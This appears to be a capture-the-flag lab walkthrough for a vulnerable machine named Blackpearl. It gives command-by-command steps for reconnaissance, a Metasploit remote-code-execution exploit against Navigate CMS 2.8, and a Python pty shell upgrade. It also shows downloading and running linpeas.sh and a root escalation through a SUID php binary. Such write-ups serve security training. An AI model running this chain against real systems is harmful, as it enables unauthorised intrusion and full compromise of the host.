user - root , password -tcm 

```bash
ping <target-ip-addr> # success = '0' packet loss
```

```bash
nmap -A <target-ip-addr> 
```
- fuzz the directory to know if there are any sub-directories that can be exploited ! 
```bash 
# on your device
ffuf -w /SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://<target-ip-addr>/FUZZ -v
```
- got "secret" , but not much of a help ! 
- when we did 'nmap' we got this 
```bash
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
```
- so let's find out the domain 
```bash
dnsrecon -r 127.0.0.0/24 -n <target-ip-addr>
```
- we'll find `<target-ip-addr> blackpearl.tcm` , if you directly search `http://blackpearl.com` it leads to null 
- here's the twist , we need to first add it to the /etc/hosts
```bash
sudo nano /etc/hosts
# add this <target-ip-addr> blackpearl.tcm
```
- now open it on the browser , you'll find php page 
- fuzz this domain and you'll get to know it works on "navigate CMS"  --version 2.8 | an outdated thing , time to exploit this

![[Screenshot 2026-07-27 at 6.43.54 PM.png]]
- go find the exploit and move further , if you stumble anywhere come back to see the solution 
- you must have found that we need to use metasploit to exploit this "navigate_cms" 
```bash
msfconsole 
search exploit/multi/http/navigate_cms_rce # use it 
show options # set rhosts and set vhost 
run
```
- after getting a meterpreter session , run 'shell' , you'll see we get nothing , in order to have an interactive shell paste this python one-liner
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
- shell might look like this --> www-data@blackpearl:~/blackpearl.tcm/navigate$ 
- and this is not the root privilege , so we need to make it one 
- rememeber linpeas , let's get our 'linpeas.sh' rolling , to see if we can get anything 
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
./linpeas.sh
```
- unluckly we found nothing here 
- let's try different approach , **SUID (Set User ID)** permission bit turned on for how many , and what specific things 
```bash
find / -type f -perm -4000 2>/dev/null
```
- we might get a list , but one of those is --> '/usr/bin/php7.3' 
- GTFObins , will help us reach our goal , src --> https://gtfobins.org/gtfobins/php/#shell | look through the website more to know what things to use , how to use , what can be achieved by performing/running these one-line commands , but for now ;
```bash
cd / # come to home directory i.e www-data@blackpearl:/$ 
usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);" 
```
- this will escalate our privileges to 'root' , you can check by the following commands 
```bash
whoami
# root {success} 
ls 
cat flag.txt
```
